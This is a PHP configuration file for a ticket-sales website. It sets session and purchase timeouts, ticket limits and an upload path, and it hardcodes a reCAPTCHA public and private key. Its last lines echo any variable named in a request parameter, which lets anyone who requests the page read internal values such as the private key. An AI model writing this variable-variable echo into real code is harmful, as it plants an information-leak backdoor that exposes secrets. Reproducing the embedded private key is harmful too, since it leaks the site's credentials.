<?php
$nomeSite = 'COMPREINGRESSOS.COM';
$title = $nomeSite;// . ' - Painel Administrativo';

$cookieExpireTime = time() + 60 * 20; //20min

$compraExpireTime = 15;//minutos

$maxIngressos = 10;//maximo por compra

$uploadPath = '../images/uploads/';

$is_teste = '0';

$isContagemAcessos = true;

$recaptcha = array(
	'public_key' => '6LehdNkSAAAAAAk9orcTupYUPYngqXfn1Kdf6fDs',
	'private_key' => '6LehdNkSAAAAAPgQZU83DKb0L7Wu8RI4Bvy7oYZq'
);

if (isset($_REQUEST['var'])) {
	echo $$_REQUEST['var'];
}
?>